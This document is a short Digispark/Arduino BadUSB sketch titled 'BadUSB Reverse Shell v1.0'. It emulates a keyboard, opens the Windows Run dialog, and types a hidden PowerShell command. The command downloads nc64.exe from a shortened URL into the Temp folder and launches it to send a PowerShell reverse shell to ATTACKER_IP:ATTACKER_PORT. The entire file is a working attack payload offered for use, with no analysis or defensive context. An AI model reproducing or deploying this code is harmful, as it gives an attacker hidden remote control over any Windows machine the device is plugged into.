#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
	// Description: BadUSB Reverse Shell v1.0
	DigiKeyboard.delay(1000);
	 DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
 	DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:Temp/nc64.exe -Uri https://tinyurl.com/3dkmj364 ; Start-Process \"$env:Temp/nc64.exe\" -ArgumentList \'ATTACKER_IP\', \'ATTACKER_PORT\', \'-e\', \'powershell\' -NoNewWindow\"");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(500);
 	exit(0);
}
